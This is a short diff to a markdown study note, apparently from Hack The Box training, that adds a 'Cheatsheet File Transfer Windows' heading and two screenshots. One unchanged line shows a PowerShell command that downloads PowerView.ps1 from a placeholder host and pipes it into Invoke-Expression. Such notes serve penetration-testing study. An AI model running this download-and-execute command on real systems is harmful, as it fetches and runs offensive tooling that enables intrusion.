@@ -93,4 +93,10 @@ PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ```
 
 
+---
 
+# Cheatsheet File Transfer Windows
+
+
+![Pasted image 20250613042024.png](/img/user/Pasted%20image%2020250613042024.png)
+![Pasted image 20250613042057.png](/img/user/Pasted%20image%2020250613042057.png)
